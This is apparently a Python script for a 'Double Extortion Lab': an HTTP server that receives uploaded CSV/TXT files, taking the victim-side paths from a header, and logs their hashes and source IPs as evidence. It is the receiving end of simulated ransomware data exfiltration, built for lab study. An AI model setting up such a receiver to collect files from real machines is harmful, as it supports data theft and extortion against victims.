#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import unquote
from datetime import datetime, timezone
import hashlib
import json

# Receiver configure
HOST = "0.0.0.0"
PORT = 8000

BASE_DIR = Path.home() / "lab"
RECEIVED_DIR = BASE_DIR / "received"
EVIDENCE_DIR = BASE_DIR / "evidence"
LOG_FILE = EVIDENCE_DIR / "upload.log"

# Limit file size: 5MB
MAX_FILE_SIZE = 5 * 1024 * 1024


class UploadHandler(BaseHTTPRequestHandler):

    def do_POST(self):
        if self.path != "/upload":
            self.send_error(404, "Endpoint not found")
            return

        try:
            content_length = int(self.headers.get("Content-Length", "-1"))
        except ValueError:
            self.send_error(400, "Invalid Content-Length")
            return

        if content_length < 0 or content_length > MAX_FILE_SIZE:
            self.send_error(443, "Invalid or oversized file")
            return

        # Get Victim's PATH
        relative_path = unquote(
                self.headers.get("X-Relative-Path", "")
        )

        parts = Path(relative_path).parts

        # Only received file CSV/TXT
        if (
                not relative_path
                or Path(relative_path).is_absolute()
                or ".." in parts
                or not parts
                or Path(relative_path).suffix.lower() not in {".csv", ".txt"}
        ):
            self.send_error(400, "Invalid file path or extension")
            return

        destination = RECEIVED_DIR.joinpath(*parts)

        try:
            destination.resolve().relative_to(RECEIVED_DIR.resolve())
        except ValueError:
            self.send_error(400, "Invalid destination")
            return

        # Do not overwrite file received
        if destination.exists():
            self.send_error(409, "File already exists")
            return
        
        data = self.rfile.read(content_length)

        if len(data) != content_length:
            self.send_error(400, "Incomplete upload")
            return

        file_hash = hashlib.sha256(data).hexdigest()
        destination.parent.mkdir(parents=True, exist_ok=True)

        try:
            with destination.open("xb") as output:
                output.write(data)
        except FileExistsError:
            self.send_error(409, "File already exists")
            return

        record = {
                "timestamp_utc": datetime.now(timezone.utc).isoformat(),
                "source_ip": self.client_address[0],
                "relative_path": relative_path,
                "size_bytes": len(data),
                "sha256": file_hash
        }

        with LOG_FILE.open("a", encoding="utf-8") as log:
            log.write(json.dumps(record, ensure_ascii=False) + "\n")

        response = {
                "status": "received",
                "file": relative_path,
                "size_bytes": len(data),
                "sha256": file_hash
        }

        response_data = json.dumps(response).encode("utf-8")

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(response_data)))
        self.end_headers()
        self.wfile.write(response_data)

        print(
                f"[RECEIVED] {relative_path} | "
                f"{len(data)} bytes | SHA256: {file_hash}"
        )
       
    def log_message(self, fotmat, *args):
        pass

if __name__ == "__main__":
    RECEIVED_DIR.mkdir(parents=True, exist_ok=True)
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)

    server = HTTPServer((HOST, PORT), UploadHandler)

    print("Double Extortion Lab - Receiver")
    print(f"Listening on {HOST}:{PORT}")
    print(f"Saving files to: {RECEIVED_DIR}")
    print("Press Ctrl+c to stop.")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nReceiver stopped.")
    finally:
        server.server_close()
